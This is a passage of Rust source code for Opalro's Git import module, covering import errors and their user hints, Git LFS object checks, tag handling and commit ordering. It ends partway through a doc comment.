//! Importing a Git repository into Opalro (milestone 2): `import_git`, the whole of `opalro import`,
//! and why an import stops; in `names`, the names refs take in Opalro; in `convert`, how Git's
//! objects become Opalro's.
#![deny(clippy::indexing_slicing, clippy::arithmetic_side_effects)]

use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
use std::fmt::Write as _;
use std::path::Path;

use crate::config::UserImportSettings;
use crate::diary::{Action, DiaryEntry, Position, ServerLines, State, TagList, TagListWriter};
use crate::encoding::DecodeError;
use crate::git::{
    self, GitError, GitId, Head, MAX_LFS_POINTER_BYTES, ObjectType, Refs, Refusal, lfs_pointer,
    parse_tag, parse_tree, shown,
};
use crate::id::{ChangeId, Id, hash_record};
use crate::listing::{EntryKind, SaveLimits};
use crate::names::{NameError, is_git_alias, validate_name};
use crate::pack::{ObjectKind, PackError, PackSet};
use crate::repo::{self, ChangeLock, RepoError, Repository};
use crate::safe_fs;
use crate::save::Person;
use crate::store::{Store, StoreError};
use crate::text::{bytes, escape, escape_all, thousands};
use crate::warning::{self, Warning};

mod convert;
mod names;

pub use convert::{Converter, Counts, MAX_LISTED, TagOutcome};
use convert::{
    LfsRules, MAX_EXTRA_PARENTS, TagBudget, at, bug, check_tag_chain, check_tag_object,
    expect_kind, may_be_lfs, outline, shown_path, tag_message,
};
use names::{Named, Names};
// For tests that check an import's names against Git's refs.
#[cfg(feature = "test-support")]
pub use names::{Rules, rename};

/// What `import_git` needs besides the folder.
pub struct ImportRequest<'a> {
    /// Who runs the import, for the diary; the saves keep Git's people.
    pub who: &'a Person,
    /// The command as the diary records it; already redacted.
    pub command: &'a str,
    /// What the user's own Git settings set that an import reads, `lfs.storage` and
    /// `core.sparseCheckout` (`config::git_import_settings`), around which the repository's own
    /// settings come, as in Git.
    pub git_settings: Option<&'a UserImportSettings>,
    /// Called as each pass goes: with how many commits it has done, and how many there are once
    /// that is known.
    pub progress: &'a mut dyn FnMut(ImportPass, u64, Option<u64>),
}

/// Which pass an import is in, for its progress.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ImportPass {
    /// Reading Git's history: how many commits there are isn't known yet.
    ReadingHistory,
    /// Looking at every commit's Git LFS files, when the repository shows a sign of Git LFS.
    CheckingLfs,
    /// Converting each commit.
    Importing,
}

/// What an import brought in, and what it left out (decision 033's summary). Names and paths
/// from Git are kept as they are, with U+FFFD for bytes that aren't UTF-8, and escaped only where
/// they are shown.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImportReport {
    pub commits: u64,
    pub lines: u64,
    pub servers: u64,
    pub server_lines: u64,
    pub tags: u64,
    /// On the line of Git's current branch, or at the save of a detached `HEAD`.
    pub position: Position,
    pub renamed: Vec<Renaming>,
    /// The whole names of the first 100 refs not imported (the stash, notes, pull requests and
    /// the like), in byte order, and how many there are.
    pub skipped_refs: Vec<String>,
    pub skipped_ref_count: u64,
    /// Each tag not imported, by its Git name, and why.
    pub skipped_tags: Vec<(String, String)>,
    /// The first 100 entries left out of saves, as the commit (hex) and the path.
    pub skipped_entries: Vec<(String, String)>,
    pub skipped_entry_count: u64,
    /// Commits a later export can't recreate with their Git IDs.
    pub inexact_commits: u64,
    /// The Git LFS files brought in from `.git/lfs/objects`, each object once, and their total
    /// size.
    pub lfs_files: u64,
    pub lfs_bytes: u64,
    /// The commits that hold Git LFS files, whose Git IDs a later export can give back only by
    /// turning those files back into pointers.
    pub lfs_commits: u64,
    /// The Git LFS pointers not in the exact form Git LFS writes, which a later export can't
    /// give back as they were.
    pub inexact_lfs_pointers: u64,
    pub warnings: Vec<Warning>,
}

/// A name Opalro's rules refuse, and the one it was given (decision 033).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Renaming {
    /// `line`, `server`, `server_line` or `tag`.
    pub kind: &'static str,
    /// Git's name; a server line's is `<server>/<branch>`, as Git shows it.
    pub git: String,
    /// Opalro's name; a server line's is `<line>@<server>`, as Opalro shows it.
    pub opalro: String,
}

/// Why an import stops. Text from the repository is shown escaped.
#[derive(Debug, thiserror::Error)]
pub enum ImportError {
    #[error(transparent)]
    Git(#[from] GitError),
    #[error(transparent)]
    Repo(#[from] RepoError),
    #[error(transparent)]
    Store(#[from] StoreError),
    #[error(transparent)]
    Pack(#[from] PackError),
    /// The import can't go on; `what` says why, naming the commit or tag.
    #[error("{}", escape(what, false))]
    Stop { what: String, hint: Option<String> },
    /// Names that aren't valid UTF-8 (decision 019): the first ones as the commit (hex) and the
    /// path, with U+FFFD for bytes that aren't UTF-8, and how many there are. Paths here, as in
    /// `Counts`, are kept as they are and escaped only where they are shown.
    #[error("{}", not_utf8_message(first, *count))]
    NotUtf8Names {
        first: Vec<(String, String)>,
        count: u64,
    },
    /// Git LFS files whose objects aren't in `.git/lfs/objects` as plain files of their pointers'
    /// sizes: the first 20 as the commit (hex), the path and the size its pointer gives, then how
    /// many objects are missing in all, and their total size. `config_includes`: the repository's
    /// config has `[include]` or `[includeIf]` sections, which Opalro doesn't read.
    #[error("{}", lfs_missing_message(first, *count, *bytes))]
    LfsMissing {
        first: Vec<(String, String, u64)>,
        count: u64,
        bytes: u64,
        config_includes: bool,
    },
    /// The Git LFS file at `path` in the commit `commit` (hex): its object `oid` (hex) doesn't
    /// have the SHA-256 its pointer gives.
    #[error("{}", lfs_mismatch_message(commit, path, oid))]
    LfsMismatch {
        commit: String,
        path: String,
        oid: String,
    },
    /// A Git LFS pointer with extension lines at `path` in the commit `commit` (hex): only Git
    /// LFS can rebuild its file, by running a program.
    #[error("{}", lfs_extension_message(commit, path))]
    LfsExtension { commit: String, path: String },
    /// The Git LFS file at `path` in the commit `commit` (hex) is kept, with every other, outside
    /// `.git/lfs/objects`, where Opalro reads them, as `kept` says.
    #[error("{}", lfs_elsewhere_message(kept, commit, path))]
    LfsElsewhere {
        kept: LfsElsewhere,
        commit: String,
        path: String,
    },
    /// The import stopped after it began the project, before `format`: the `.opalro` it began
    /// stays, for a later run to finish from what it stored (decision 041). `committed`: it holds
    /// a head, whose entry may hold the whole import.
    #[error("{stop}")]
    Unfinished {
        stop: Box<ImportError>,
        committed: bool,
    },
}

/// How an import's hints begin when it stopped before it wrote anything.
const NOTHING_CHANGED: &str = "Nothing was changed.";

impl ImportError {
    /// What the user can do next, if there is something to say.
    #[must_use]
    pub fn hint(&self) -> Option<String> {
        match self {
            ImportError::Unfinished { stop: e, committed } => {
                // Deleting is offered only while no head was written.
                let kept = if *committed {
                    "The import's history is stored, but the .opalro folder isn't a finished project \
                     yet. Run opalro import again here to finish it from what was stored."
                } else if e.may_pass_when_run_again() {
                    "Nothing was committed. Opalro kept the .opalro folder it began here, so that \
                     running opalro import again can finish the import from what it stored; or \
                     delete that folder."
                } else {
                    "Nothing was committed. Opalro kept the .opalro folder it began here: opalro import \
                     stops the same way until the cause is fixed, then finishes from what it \
                     stored. Or delete that folder."
                };
                let advice = e
                    .hint()
                    .map(|hint| match hint.strip_prefix(NOTHING_CHANGED) {
                        Some(rest) => rest.trim_start().to_owned(),
                        None => hint,
                    });
                Some(match advice {
                    Some(advice) if !advice.is_empty() => format!("{advice}\n{kept}"),
                    _ => kept.to_owned(),
                })
            }
            ImportError::Git(e) => e.hint(),
            ImportError::Repo(e) => e.hint(),
            ImportError::Store(_) | ImportError::Pack(_) => None,
            ImportError::Stop { hint, .. } => hint.clone(),
            ImportError::NotUtf8Names { .. } => Some(
                "Nothing was changed. Rename them in the Git history to names in UTF-8, then run \
                 opalro import again."
                    .to_owned(),
            ),
            ImportError::LfsMissing {
                config_includes, ..
            } => {
                let mut hint = format!(
                    "{NOTHING_CHANGED} Download every version Git LFS keeps with `git lfs fetch \
                     --all`, then run opalro import again. Opalro reads a Git LFS file only from \
                     .git/lfs/objects, as a plain file of the size its pointer gives, never \
                     through a link."
                );
                // An include could set `lfs.storage`, which the stop would otherwise name.
                if *config_includes {
                    hint += " This repository's Git config has [include] or [includeIf] \
                             sections, which Opalro doesn't read: if one sets lfs.storage, the \
                             files must be in .git/lfs/objects all the same.";
                }
                // Fetching can't help while Git LFS keeps them where Opalro doesn't look.
                hint += " A Git setting Opalro doesn't read (the system's Git settings, or an \
                         [includeIf] section) may keep Git LFS's files elsewhere: `git lfs env` \
                         shows where, on its LocalMediaDir line. If that isn't .git/lfs/objects, \
                         remove that lfs.storage setting, or set it to lfs, before you download \
                         them.";
                Some(hint)
            }
            // Fetching skips an object that is there, and `fsck` looks at `HEAD` only unless
            // given the commit.
            ImportError::LfsMismatch { commit, .. } => Some(format!(
                "{NOTHING_CHANGED} Git LFS's copy is damaged or was replaced: run `git lfs fsck \
                 {}`, which moves a bad copy to .git/lfs/bad, then `git lfs fetch --all` to \
                 download it again, and run opalro import again.",
                escape(commit, false)
            )),
            // `migrate export` runs the extensions' programs, as a checkout does.
            ImportError::LfsExtension { .. } => Some(format!(
                "{NOTHING_CHANGED} Turn the Git LFS files back into ordinary Git files in a copy \
                 of the repository with `git lfs migrate export --everything --include=\"*\"`, \
                 which rewrites its history, then run opalro import in that copy."
            )),
            ImportError::LfsElsewhere {
                kept: LfsElsewhere::Storage { .. },
                ..
            } => Some(format!(
                "{NOTHING_CHANGED} Remove that setting, or set it to lfs, download the files into \
                 .git/lfs/objects with `git lfs fetch --all`, then run opalro import again."
            )),
            ImportError::LfsElsewhere {
                kept: LfsElsewhere::Linked { folder },
                ..
            } => Some(format!(
                "{NOTHING_CHANGED} Put a real folder at {}, holding what a link there points to, \
                 or remove what is there and download the files with `git lfs fetch --all`, then \
                 run opalro import again.",
                escape(folder, false)
            )),
        }
    }

    /// Whether running the import again as things are may get past this stop: Git was busy,
    /// reading or writing failed, or memory ran out. Any other stop comes again until its cause
    /// is fixed.
    fn may_pass_when_run_again(&self) -> bool {
        matches!(
            self,
            ImportError::Git(
                GitError::Changed { .. } | GitError::OutOfMemory { .. } | GitError::Io { .. }
            ) | ImportError::Repo(_)
                | ImportError::Store(_)
                | ImportError::Pack(_)
        )
    }
}

/// What an import says of Git LFS files whose objects are missing: the first ones, as the commit
/// (hex), the path and the size, then how many in all, and their total size.
fn lfs_missing_message(first: &[(String, String, u64)], count: u64, total: u64) -> String {
    let mut out = if count == 1 {
        "A Git LFS file in this history isn't in .git/lfs/objects:".to_owned()
    } else {
        format!(
            "{} Git LFS files in this history, {} in all, aren't in .git/lfs/objects:",
            thousands(count),
            bytes(total)
        )
    };
    for (commit, path, size) in first {
        let (path, commit) = (escape(path, false), escape(commit, false));
        let _ = write!(out, "\n  `{path}` in commit `{commit}` ({})", bytes(*size));
    }
    let more = count.saturating_sub(first.len() as u64);
    if more > 0 {
        let _ = write!(out, "\n  and {} more", thousands(more));
    }
    out
}

/// What an import says of the Git LFS file at `path` in `commit` whose object `oid` doesn't match
/// its pointer.
fn lfs_mismatch_message(commit: &str, path: &str, oid: &str) -> String {
    let (commit, path, oid) = (
        escape(commit, false),
        escape(path, false),
        escape(oid, false),
    );
    format!(
        "The Git LFS file `{path}` in commit `{commit}` doesn't match its pointer: what \
         .git/lfs/objects holds for object `{oid}` has another SHA-256."
    )
}

/// Where Git LFS keeps its files when not in `.git/lfs/objects`, the only place Opalro reads them.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum LfsElsewhere {
    /// `lfs.storage` names another place than Git LFS's own: `value` (cut, as text), set last in
    /// `file`.
    Storage { value: String, file: String },
    /// `folder`, `.git/lfs` or `.git/lfs/objects`, is a link, or isn't a folder.
    Linked { folder: String },
}

/// Where `lfs.storage` keeps Git LFS's files instead of `.git/lfs/objects`, if it does: as Git
/// reads it, the last found winning: the user's own settings files, then the repository's own,
/// then what the environment gives (`users` holds the first and last), set to anything but nothing
/// or `lfs`, Git LFS's own place. A path is never resolved, since Opalro never reads there. The links
/// `LfsRules` looks for wait for the first Git LFS file.
fn lfs_storage_elsewhere(
    git: &git::Repo,
    users: Option<&UserImportSettings>,
) -> Option<LfsElsewhere> {
    let files = users.and_then(|u| u.files.as_ref());
    let variables = users.and_then(|u| u.variables.as_ref());
    let (value, file) = match (variables, git.lfs_storage(), files) {
        (Some((value, file)), _, _) | (None, None, Some((value, file))) => {
            (value.as_slice(), file.clone())
        }
        (None, Some((value, file)), _) => (value, file.to_owned()),
        (None, None, None) => return None,
    };
    let value = (!matches!(value, b"" | b"lfs")).then(|| shown(value))?;
    Some(LfsElsewhere::Storage { value, file })
}

/// What an import says of the Git LFS file at `path` in `commit`, kept elsewhere as `kept` says.
fn lfs_elsewhere_message(kept: &LfsElsewhere, commit: &str, path: &str) -> String {
    let (commit, path) = (escape(commit, false), escape(path, false));
    let holds = format!("Commit `{commit}` holds a Git LFS file at `{path}`, but");
    match kept {
        LfsElsewhere::Storage { value, file } => format!(
            "{holds} `lfs.storage` keeps Git LFS's files outside .git/lfs/objects, where Opalro \
             reads them: it is set to `{}` in {}.",
            escape(value, false),
            escape(file, false)
        ),
        LfsElsewhere::Linked { folder } => format!(
            "{holds} Git LFS's files are kept outside .git/lfs/objects, where Opalro reads them: {} \
             is a link, or isn't a folder, and Opalro never follows a link in .git.",
            escape(folder, false)
        ),
    }
}

/// What an import says of the Git LFS pointer with extensions at `path` in `commit`.
fn lfs_extension_message(commit: &str, path: &str) -> String {
    let (commit, path) = (escape(commit, false), escape(path, false));
    format!(
        "Commit `{commit}` holds a Git LFS pointer at `{path}` with extensions (`ext-` lines): \
         only Git LFS can rebuild its file, by running a program, which Opalro never does."
    )
}

/// The warning for files that look like Git LFS pointers but aren't Git LFS files: the first
/// ones, as the commit (hex) and the path, and how many in all.
fn lfs_lookalikes(first: &[(String, String)], count: u64) -> Warning {
    let mut message = if count == 1 {
        "A file looks like a Git LFS pointer but isn't a Git LFS file, so Opalro imported it as it \
         is. Git LFS may check it out as it is, or as the file its start points to:"
            .to_owned()
    } else {
        format!(
            "{} files look like Git LFS pointers but aren't Git LFS files, so Opalro imported them as \
             they are. Git LFS may check each out as it is, or as the file its start points to:",
            thousands(count)
        )
    };
    for (commit, path) in first {
        let (path, commit) = (escape(path, false), escape(commit, false));
        let _ = write!(message, "\n  `{path}` in commit `{commit}`");
    }
    let more = count.saturating_sub(first.len() as u64);
    if more > 0 {
        let _ = write!(message, "\n  and {} more", thousands(more));
    }
    Warning::new(warning::LFS_LOOKALIKES, message)
}

fn not_utf8_message(first: &[(String, String)], count: u64) -> String {
    let mut out = if count == 1 {
        "A name in the Git history isn't valid UTF-8, and Opalro keeps only UTF-8 names:".to_owned()
    } else {
        format!(
            "{count} names in the Git history aren't valid UTF-8, and Opalro keeps only UTF-8 names:"
        )
    };
    for (commit, path) in first {
        let (path, commit) = (escape(path, false), escape(commit, false));
        let _ = write!(out, "\n  `{path}` in commit `{commit}`");
    }
    let more = count.saturating_sub(first.len() as u64);
    if more > 0 {
        let _ = write!(out, "\n  and {more} more");
    }
    out
}

/// Imports the Git repository whose work tree is `root` into a new Opalro project there (decisions
/// 033, 034 and 040): every commit its branches, server branches, tags and `HEAD` reach becomes a
/// save. Everything that only reads comes first, so most refusals come before `.opalro` is made.
/// The project goes into `opened` as soon as it is begun, so a caller can show what its store
/// noticed even if the import then fails. Nothing is committed until the last step writes
/// `.opalro/format`, and running it again once the cause of an earlier failure is gone finishes the
/// job, reusing what was stored once it is checked (decision 041).
pub fn import_git(
    root: &Path,
    req: &mut ImportRequest,
    opened: &mut Option<Repository>,
) -> Result<ImportReport, ImportError> {
    let root = &repo::resolved(root);
    let plan = plan(root, req.git_settings, req.progress)?;
    let (repo, lock) = Repository::begin(root).map_err(|e| begun(root, e))?;
    let repo = opened.insert(repo);
    carry_out(plan, repo, &lock, req).map_err(|e| after_begin(root, e))
}

/// `begin`'s failure, as an import says it. A refusal says what is wrong with the folder, as
/// before anything is made; any other failure comes once `.opalro` may be made.
fn begun(root: &Path, e: RepoError) -> ImportError {
    match e {
        RepoError::AlreadyAProject { .. }
        | RepoError::StartStopped { .. }
        | RepoError::OtherToolsFolder { .. }
        | RepoError::InsideAnotherProject { .. }
        | RepoError::NotYours { .. }
        | RepoError::AdminsNotElevated { .. }
        | RepoError::OwnerUnknown { .. }
        | RepoError::OwnerLookupFailed { .. }
        | RepoError::SafeFolderPassedOver { .. }
        | RepoError::Config(_) => starting(e),
        other => after_begin(root, other.into()),
    }
}

/// `e`, met once the project may be begun, as an import says it. While a real `.opalro` is there
/// without `format`, the project isn't made and the folder stays for a run to finish, noting
/// whether it holds a head. With `format`, the project was made and only the flush after it
/// failed; with no `.opalro`, there is nothing to keep. Either way `e` is said as it is.
fn after_begin(root: &Path, e: ImportError) -> ImportError {
    let opalro = safe_fs::check_real_dir(&root.join(".opalro")).is_ok();
    if opalro && matches!(repo::has_format(root), Ok(false)) {
        ImportError::Unfinished {
            stop: Box::new(e),
            committed: repo::has_head(root),
        }
    } else {
        e
    }
}

/// What the steps that only read worked out for the steps that write.
struct Plan {
    git: git::Repo,
    names: Names,
    /// The first refs left out, and how many there are.
    skipped_refs: Vec<String>,
    skipped_ref_count: u64,
    /// Every commit to convert, each after its parents.
    order: Vec<GitId>,
    /// The change IDs that commits' own IDs give and some `change-id` header gives too.
    own_change_ids: HashSet<ChangeId>,
    /// The tag list's size as the first pass counted it, with room for its longest head.
    tag_list_len: u64,
    /// The line of Git's current branch, if `HEAD` is on one, and `HEAD`'s commit.
    head_line: Option<String>,
    head_commit: GitId,
    grafts: bool,
    /// Where `lfs.storage` keeps Git LFS's files instead of `.git/lfs/objects`, if it does.
    lfs_storage: Option<LfsElsewhere>,
}

/// The steps that only read, so that the refusals they make come before anything is written.
/// `users` is what the user's own Git settings set; `progress` hears how many commits the
/// first pass has read.
fn plan(
    root: &Path,
    users: Option<&UserImportSettings>,
    progress: &mut dyn FnMut(ImportPass, u64, Option<u64>),
) -> Result<Plan, ImportError> {
    Repository::check_new(root).map_err(|e| refused(root, e))?;
    let git = git::Repo::open(root)?;
    // As in Git: the environment's, then the repository's, then the user's own files.
    let sparse = users.map_or((None, None), |u| (u.sparse_variables, u.sparse_files));
    if sparse.0.or(git.sparse_checkout()).or(sparse.1) == Some(true) {
        return Err(GitError::Refused(Refusal::SparseCheckout).into());
    }
    let lfs_storage = lfs_storage_elsewhere(&git, users);
    let refs = git.refs()?;
    let names = Names::of(&refs)?;
    let mut tag_budget = TagBudget::new();
    let roots = roots(&git, &refs, &names.tags, &mut tag_budget)?;
    if roots.is_empty() {
        return Err(ImportError::Stop {
            what: "There's nothing to import: this Git repository has no commits. opalro start \
                   makes a new project here."
                .to_owned(),
            hint: None,
        });
    }
    let (head_line, head_commit) = match &refs.head {
        Head::Branch(branch) => match names.lines.iter().find(|line| line.git == *branch) {
            Some(line) => (Some(line.opalro.clone()), line.target),
            None => return Err(unborn(branch)),
        },
        Head::Detached(id) => (None, *id),
    };
    if let Some(name) = tracked_opal(&git, &head_commit)? {
        return Err(tracked_stop(&name));
    }
    let (order, own_change_ids) = in_order(&git, &roots, MAX_EXTRA_PARENTS, progress)?;
    let setting = lfs_storage.as_ref();
    check_lfs_objects(
        &git,
        &head_commit,
        &order,
        setting,
        &SaveLimits::default,
        progress,
    )?;
    let grafts = git.has_grafts()?;
    let skipped_refs = refs.other.iter().take(MAX_LISTED);
    Ok(Plan {
        skipped_refs: skipped_refs.map(|name| lossy(name)).collect(),
        skipped_ref_count: refs.other.len() as u64,
        git,
        names,
        order,
        own_change_ids,
        tag_list_len: tag_budget.used(),
        head_line,
        head_commit,
        grafts,
        lfs_storage,
    })
}

/// The steps that write, into the project `repo` begun under `lock`: every commit, the tags, the
/// records the state points to, and the first diary entry, committed last.
fn carry_out(
    plan: Plan,
    repo: &mut Repository,
    lock: &ChangeLock,
    req: &mut ImportRequest,
) -> Result<ImportReport, ImportError> {
    let Plan {
        git,
        names,
        skipped_refs,
        skipped_ref_count,
        order,
        own_change_ids,
        tag_list_len,
        head_line,
        head_commit,
        grafts,
        lfs_storage,
    } = plan;
    let mut packs = repo.new_packs()?;
    let store = repo.store();
    let mut converter = Converter::new(&git, store, &mut packs, own_change_ids, lfs_storage);
    let total = order.len() as u64;
    for (done, id) in (1..).zip(&order) {
        converter.commit(id)?;
        (req.progress)(ImportPass::Importing, done, Some(total));
    }
    converter.finish()?;
    // Each tag goes into the list as it is read, in the list's order, and is let go: the tags
    // are never held whole beside the list.
    let mut in_list_order: Vec<&Named> = names.tags.iter().collect();
    in_list_order.sort_by(|a, b| a.opalro.cmp(&b.opalro));
    let mut tag_list = TagListWriter::with_capacity(tag_list_len);
    let mut skipped_tags = Vec::new();
    for tag in in_list_order {
        match converter.tag(&tag.opalro, &tag.target)? {
            TagOutcome::Tag(kept) => tag_list.push(&tag.opalro, &kept),
            TagOutcome::Skipped { reason } => skipped_tags.push((lossy(&tag.git), reason)),
        }
    }
    let tag_count = tag_list.count();
    let lines = lines_of(&converter, &names.lines)?;
    let mut server_lines = ServerLines::default();
    for (server, own) in &names.servers {
        let own = lines_of(&converter, own)?;
        server_lines.servers.insert(server.clone(), own);
    }
    let position = match head_line {
        Some(line) => Position::OnLine(line),
        None => Position::AtSave(converter.save_of(&head_commit)?),
    };
    let counts = converter.counts().clone();

    let tags = if tag_count == 0 {
        None
    } else {
        let encoded = tag_list.finish();
        Some(put_record(
            repo.store(),
            &mut packs,
            ObjectKind::TagList,
            &encoded,
            TagList::check,
        )?)
    };
    let servers = if server_lines.servers.is_empty() {
        None
    } else {
        let encoded = server_lines.encode();
        Some(put_record(
            repo.store(),
            &mut packs,
            ObjectKind::ServerLines,
            &encoded,
            ServerLines::check,
        )?)
    };
    let mut warnings = opal_folder_warnings(&git, &head_commit)?;
    if grafts {
        warnings.push(Warning::new(
            warning::GRAFTS_IGNORED,
            "Git's grafts file was ignored; Opalro imported the commits as they are.",
        ));
    }
    if counts.duplicate_change_ids > 0 {
        warnings.push(duplicate_change_ids(counts.duplicate_change_ids));
    }
    if counts.lfs_lookalike_count > 0 {
        warnings.push(lfs_lookalikes(
            &counts.lfs_lookalikes,
            counts.lfs_lookalike_count,
        ));
    }
    if git.has_config_includes() {
        warnings.push(Warning::new(
            warning::CONFIG_INCLUDES_IGNORED,
            "Git's config here includes other files ([include] or [includeIf]), which Opalro \
             doesn't read, so it can't tell whether they turn on sparse checkout. If `git config \
             core.sparseCheckout` says true, Git left some files out of this folder: run `git \
             sparse-checkout disable` before your first save, or that save will record them as \
             deleted (they stay in history and can be brought back).",
        ));
    }
    let mut report = ImportReport {
        commits: total,
        lines: lines.len() as u64,
        servers: server_lines.servers.len() as u64,
        server_lines: server_lines
            .servers
            .values()
            .map(|own| own.len() as u64)
            .sum(),
        tags: tag_count,
        position: position.clone(),
        renamed: names.renamed,
        skipped_refs,
        skipped_ref_count,
        skipped_tags,
        skipped_entries: counts.skipped_entries,
        skipped_entry_count: counts.skipped_entry_count,
        inexact_commits: counts.inexact_commits,
        lfs_files: counts.lfs_files,
        lfs_bytes: counts.lfs_bytes,
        lfs_commits: counts.lfs_commits,
        inexact_lfs_pointers: counts.inexact_lfs_pointers,
        warnings,
    };
    let entry = DiaryEntry {
        parent: None,
        action: Action::Command,
        command: req.command.to_owned(),
        who: req.who.clone(),
        opal_version: env!("CARGO_PKG_VERSION").into(),
        state: State {
            lines,
            tags,
            position,
            shelves: Vec::new(),
            server_lines: servers,
        },
        folder_change: None,
    };
    repo.commit_first(lock, packs, &entry)?;
    report.warnings.extend(repo.store().warnings());
    Ok(report)
}

/// `check_new`'s refusal of `root`, as an import says it. A `.opalro` that Git checked out makes it
/// refuse for the wrong reason (a project already, another tool's folder, damage), so then the
/// import says that Git tracks it.
fn refused(root: &Path, e: RepoError) -> ImportError {
    let about_opal = matches!(
        e,
        RepoError::AlreadyAProject { .. }
            | RepoError::OtherToolsFolder { .. }
            | RepoError::Damaged { .. }
    );
    if about_opal && let Some(name) = tracked_at(root) {
        return tracked_stop(&name);
    }
    starting(e)
}

/// The name of a `.opalro` entry Git tracks at the top of the commit `root`'s Git repository is
/// on, if Opalro can read the repository to tell. It only reads, as `plan` does.
fn tracked_at(root: &Path) -> Option<String> {
    let git = git::Repo::open(root).ok()?;
    let refs = git.refs().ok()?;
    let head = match refs.head {
        Head::Branch(branch) => refs.branches.iter().find(|(name, _)| *name == branch)?.1,
        Head::Detached(id) => id,
    };
    tracked_opal(&git, &head).ok().flatten()
}

/// A refusal from making the project, as an import says it.
fn starting(e: RepoError) -> ImportError {
    match e {
        RepoError::AlreadyAProject { .. } => ImportError::Stop {
            what:
                "This folder is already an Opalro project. Picking up new Git commits comes in a \
                   later version."
                    .to_owned(),
            hint: Some(
                "To import the Git repository again, run opalro import in a fresh clone of it."
                    .to_owned(),
            ),
        },
        // Its own hint says to run `opalro start` again, which would make an empty project.
        RepoError::StartStopped { refusal } => {
            let hint = refusal.hint_then("Then run opalro import again to finish.");
            let what = RepoError::StartStopped { refusal }.to_string();
            ImportError::Stop { what, hint }
        }
        other => other.into(),
    }
}

/// Git's `HEAD` names the branch `branch`, which has no commits yet (decision 033).
fn unborn(branch: &[u8]) -> ImportError {
    ImportError::Stop {
        what: format!(
            "Git's current branch `{}` has no commits yet; switch to a branch with commits, or \
             commit first.",
            shown(branch)
        ),
        hint: Some(
            "Nothing was changed. Run opalro import again once Git's current branch has commits."
                .to_owned(),
        ),
    }
}

/// Bytes from Git as text, with U+FFFD for bytes that aren't UTF-8.
fn lossy(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

/// What the first pass learned of an object a tag reaches: a tag object, or the commit, tree or
/// blob a chain ends at, which has no tag objects and no message.
struct Seen {
    /// Where the chain from it ends: a commit, or nothing Opalro can tag.
    end: Option<GitId>,
    /// The size of each tag object on the chain from it, it first.
    objects: Vec<usize>,
    /// How long its message is as an Opalro tag holds it.
    message: usize,
}

/// The commits an import starts from (decision 033): those of the branches and the server
/// branches, those the tags end at, and a detached `HEAD`'s. Tags are held to every limit
/// `Converter::tag` holds them to, the size of the tag list they make included, so a tag it would
/// refuse stops the import before anything is written. Each object a tag reaches is looked at
/// once, however many tags reach it.
fn roots(
    git: &git::Repo,
    refs: &Refs,
    tags: &[Named],
    budget: &mut TagBudget,
) -> Result<BTreeSet<GitId>, ImportError> {
    let mut roots: BTreeSet<GitId> = refs.branches.iter().map(|(_, id)| *id).collect();
    roots.extend(refs.servers.iter().map(|(_, _, id)| *id));
    if let Head::Detached(id) = &refs.head {
        roots.insert(*id);
    }
    let mut seen: HashMap<GitId, Seen> = HashMap::new();
    for tag in tags {
        let name = tag.opalro.as_str();
        budget.room_for(name)?;
        // Each tag object read for this tag, its size and its message's length.
        let mut read: Vec<(GitId, usize, usize)> = Vec::new();
        let mut id = tag.target;
        let (end, rest, known) = loop {
            if let Some(known) = seen.get(&id) {
                let objects = read.len().saturating_add(known.objects.len());
                check_tag_chain(name, objects as u64)?;
                break (known.end, known.objects.clone(), Some(known.message));
            }
            let hex = id.to_hex();
            let here = || format!("tag `{name}`, at object `{hex}`");
            let (kind, size) = git.header(&id).map_err(|e| at(e, here))?;
            if kind != ObjectType::Tag {
                let end = (kind == ObjectType::Commit).then_some(id);
                let none = Seen {
                    end,
                    objects: Vec::new(),
                    message: 0,
                };
                seen.insert(id, none);
                break (end, Vec::new(), None);
            }
            check_tag_object(name, &id, size)?;
            check_tag_chain(name, (read.len() as u64).saturating_add(1))?;
            let object = git.read(&id).map_err(|e| at(e, here))?;
            expect_kind(object.kind, ObjectType::Tag, &id, here)?;
            check_tag_object(name, &id, object.data.len() as u64)?;
            let parsed = parse_tag(&object.data, git.hash()).map_err(|e| at(e, here))?;
            read.push((id, object.data.len(), tag_message(parsed.message).len()));
            id = parsed.object;
        };
        // The whole chain from the ref: the tag objects read now, then those known before.
        let objects: Vec<usize> = read.iter().map(|&(_, size, _)| size).chain(rest).collect();
        for (i, &(object, _, message)) in read.iter().enumerate() {
            let objects = objects.get(i..).unwrap_or_default().to_vec();
            seen.insert(
                object,
                Seen {
                    end,
                    objects,
                    message,
                },
            );
        }
        if let Some(commit) = end {
            roots.insert(commit);
            // A tag keeps the message of the first tag object on its chain, if there is one.
            let message = read.first().map(|&(_, _, message)| message).or(known);
            let len = TagList::tag_len_from(name.len(), message.unwrap_or(0), objects.into_iter());
            budget.add(name, len)?;
        }
    }
    Ok(roots)
}

/// Every commit `roots` reach, each after its parents: pass 1, which reads each commit once
/// before anything is written. It walks with a stack of its own, into roots and parents in the
/// order of their Git IDs, so the order is the same every time, and it stops once the commits
/// have more than `most_extra` parents beyond each one's first. Pass 2 reads each commit's
/// parents again, so none are kept here. Also gives the change IDs that commits' own IDs give
/// and some commit's `change-id` header gives too, which no header may give (decision 043).
/// `progress` hears how many commits it has read, as it reads each.
fn in_order(
    git: &git::Repo,
    roots: &BTreeSet<GitId>,
    most_extra: u64,
    progress: &mut dyn FnMut(ImportPass, u64, Option<u64>),
) -> Result<(Vec<GitId>, HashSet<ChangeId>), ImportError> {
    let mut walk = FirstPass {
        git,
        progress,
        read: 0,
        most_extra,
        ids: Vec::new(),
        by_id: HashMap::new(),
        entered: Vec::new(),
        stack: Vec::new(),
        todo: Vec::new(),
        extra: 0,
        headers: HashSet::new(),
    };
    let mut order = Vec::new();
    for root in roots {
        let root = walk.index_of(*root)?;
        walk.enter(root)?;
        while let Some(&(top, start)) = walk.stack.last() {
            if walk.todo.len() > start
                && let Some(parent) = walk.todo.pop()
            {
                walk.enter(parent)?;
            } else {
                walk.stack.pop();
                order.push(walk.id(top)?);
            }
        }
    }
    let own_change_ids = order
        .iter()
        .map(|id| ChangeId::from_git_commit(id.as_bytes()))
        .filter(|own| walk.headers.contains(own))
        .collect();
    Ok((order, own_change_ids))
}

/// Pass 1's walk. Each commit met gets an index into one table of IDs, which stands for it on the
/// stack: a commit on the way down costs 4 bytes for each parent it still has to go into.
